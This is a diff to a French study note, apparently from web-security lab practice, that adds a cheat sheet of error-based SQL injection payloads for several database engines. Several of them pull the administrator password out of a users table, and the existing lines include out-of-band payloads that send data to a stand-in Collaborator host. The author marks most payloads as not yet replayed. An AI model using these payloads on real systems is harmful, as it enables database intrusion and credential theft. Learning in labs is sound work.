@@ -143,9 +143,21 @@ statut: en cours
 - Erreur conditionnelle, Microsoft : `' AND 1=(SELECT CASE WHEN (cond) THEN 1/0 ELSE 1 END)--`
 - Erreur conditionnelle, PostgreSQL : `' AND 1=(SELECT CASE WHEN (cond) THEN 1/(SELECT 0) ELSE 1 END)--`
 - Erreur verbeuse, PostgreSQL : `' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--` (vider la valeur d'origine du cookie si le message est tronqué)
+- Erreur verbeuse, PostgreSQL, variante sans le mot `CAST` : `' AND 1=(SELECT username FROM users LIMIT 1)::int-- ` ; signal : `invalid input syntax for type integer: "<valeur>"`
+- Erreur verbeuse, MySQL et MariaDB : `' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT password FROM users WHERE username='administrator' LIMIT 1)))-- ` ; signal : `XPATH syntax error: '~<valeur>'` ; environ 32 caractères affichés, extraire par tranches avec `SUBSTRING`
+- Erreur verbeuse, MySQL et MariaDB, équivalent : `' AND UPDATEXML(1,CONCAT(0x7e,(SELECT password FROM users WHERE username='administrator' LIMIT 1)),1)-- ` (si `EXTRACTVALUE` est filtré)
+- Erreur verbeuse, MySQL, double requête (ancien, version dépendante) : `' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),0x7e,FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) y)-- ` ; signal : `Duplicate entry '<valeur>~1' for key 'group_key'`
+- Erreur conditionnelle, MySQL (`1/0` ne lève pas d'erreur en lecture) : `' AND IF(cond,(SELECT table_name FROM information_schema.tables),'a')-- ` ; signal : `Subquery returns more than 1 row` quand `cond` est vraie
+- Erreur verbeuse, Microsoft : `' AND 1=CONVERT(int,(SELECT TOP 1 password FROM users WHERE username='administrator'))-- ` ; signal : `Conversion failed when converting the nvarchar value '<valeur>' to data type int`
+- Erreur verbeuse, Microsoft, version et utilisateur : `' AND 1=CONVERT(int,@@version)-- ` ; `' AND 1=CONVERT(int,SYSTEM_USER)-- ` ; plusieurs lignes : `STRING_AGG(name,',')` (SQL Server 2017 et suivants) ou `FOR XML PATH('')` (versions plus anciennes)
+- Erreur verbeuse, Oracle : `' AND 1=(SELECT UPPER(XMLTYPE(CHR(60)||CHR(58)||(SELECT password FROM users WHERE username='administrator' AND ROWNUM=1)||CHR(62))) FROM dual)-- ` ; signal : `ORA-31011: XML parsing failed` avec la valeur dans le détail
+- Erreur verbeuse, Oracle, selon la version et les droits : `' AND 1=UTL_INADDR.GET_HOST_NAME((SELECT user FROM dual))-- ` (signal `ORA-29257: host <valeur> unknown`) ; `' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT user FROM dual))-- ` (signal `ORA-20000`, exige Oracle Text)
+- Erreur conditionnelle, SQLite (à vérifier selon la version) : `' AND (SELECT CASE WHEN (cond) THEN abs(-9223372036854775808) ELSE 1 END)=1-- ` ; signal : `integer overflow` ; oracle conditionnel uniquement, aucune fuite de valeur
+- Reconnaissance du moteur par le message d'erreur : `XPATH syntax error` ou `Subquery returns more than 1 row` pour MySQL, `invalid input syntax for type integer` pour PostgreSQL, `ORA-` pour Oracle, `Conversion failed` ou `Divide by zero error` pour Microsoft
+- Seul `TO_CHAR(1/0)` sur Oracle a été rejoué (lab du journal) ; les autres payloads d'erreur sont non rejoués, voir [[Error-based SQL Injection]] pour les limites et les points à vérifier
 - Délai simple (10 secondes) : Oracle `'||dbms_pipe.receive_message(('a'),10)--`, Microsoft `'; WAITFOR DELAY '0:0:10'--`, PostgreSQL `'||pg_sleep(10)--`, MySQL `' AND SLEEP(10)-- -`
 - Délai conditionnel : Oracle `' || (SELECT CASE WHEN (cond) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual)--`, Microsoft `'; IF (cond) WAITFOR DELAY '0:0:10'--`, PostgreSQL `'%3BSELECT CASE WHEN (cond) THEN pg_sleep(10) ELSE pg_sleep(0) END--` (`;` encodé dans un cookie), MySQL `' AND IF(cond,SLEEP(10),0)-- -`
 - Hors bande : Microsoft `'; exec master..xp_dirtree '//COLLAB/a'--`, PostgreSQL `'; copy (SELECT '') to program 'nslookup COLLAB'--` (privilèges élevés), Oracle `UTL_INADDR.get_host_address('COLLAB')` (privilèges élevés) ; `COLLAB` = sous-domaine Burp Collaborator ; exfiltration en plaçant la sous-requête dans le sous-domaine
 - Burp Intruder : délais, Resource pool à une requête simultanée ; deux positions (index et caractère), Cluster bomb
 - Non rejoués sur une base : les payloads d'erreur, de délai et hors bande sont à vérifier sur les labs correspondants avant de s'y fier
-- Détail : [[SQL-injection]], [[SQL-injection-Union-Attacks]], [[Blind-SQL-injection]]
+- Détail : [[SQL-injection]], [[SQL-injection-Union-Attacks]], [[Blind-SQL-injection]], [[Error-based SQL Injection]]
